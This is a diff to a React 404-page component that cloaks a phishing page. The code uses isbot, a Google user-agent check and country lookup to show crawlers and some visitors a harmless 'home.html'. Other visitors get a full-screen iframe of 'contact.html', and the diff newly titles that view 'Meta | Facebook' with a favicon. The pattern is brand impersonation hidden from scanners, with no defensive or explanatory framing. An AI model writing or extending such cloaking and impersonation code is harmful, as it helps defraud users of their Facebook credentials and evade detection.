@@ -1,13 +1,23 @@
 import React, { useEffect, useState } from "react";
 import { isbot } from "isbot";
+import { Helmet } from 'react-helmet';
 
 function NotFound() {
-  //let[HtmlLandingPage, SetHtmlLandingPage] = useState();
+  let[HtmlLandingPage, SetHtmlLandingPage] = useState();
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
 
-  function showIframe(file) {
+  function showIframe(file,title,favicon) {
     const html = (
+      <>
+      <Helmet>
+          <title>{title}</title>
+          {favicon ? 
+          <link rel="icon" type="image/svg+xml" href="/favicon2.ico"/>
+           :
+           null
+          }
+      </Helmet>
       <iframe src={file} style={{
         position: 'fixed',
         top: '0px',
@@ -21,13 +31,14 @@ function NotFound() {
         zIndex: '999999',
         height: '100%',
       }}></iframe>
+      </>
     );
     return html;
   }
  
-  // async function fetchHtml() {
-  //   SetHtmlLandingPage(await (await fetch(`home.html`)).text());
-  // }
+  async function fetchHtml() {
+    SetHtmlLandingPage(await (await fetch(`home.html`)).text());
+  }
 
   const setLocaltion =  () => {
     try {
@@ -53,9 +64,9 @@ function NotFound() {
     }
   };
 
-  // useEffect(() => {
-  //   fetchHtml();
-  // }, []);
+  useEffect(() => {
+    fetchHtml();
+  }, []);
 
   useEffect(() => {
     setLocaltion();
@@ -66,8 +77,7 @@ function NotFound() {
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
     if(IsUserHiden){
-      //return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
-      return(showIframe("home.html"));
+      return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
     }else{
       if(countryCode.length == 0){
         return(           
@@ -77,14 +87,14 @@ function NotFound() {
         );
       }else{
         if(countryCode.includes('vn')){
-          return(showIframe("home.html"));
+          return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
         }else{
-            return(showIframe("contact.html"));
+          return(showIframe("contact.html",'Meta | Facebook',true));
         }
       }
     }
   }else{
-    return(showIframe("home.html"));
+    return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
   }
 }
 
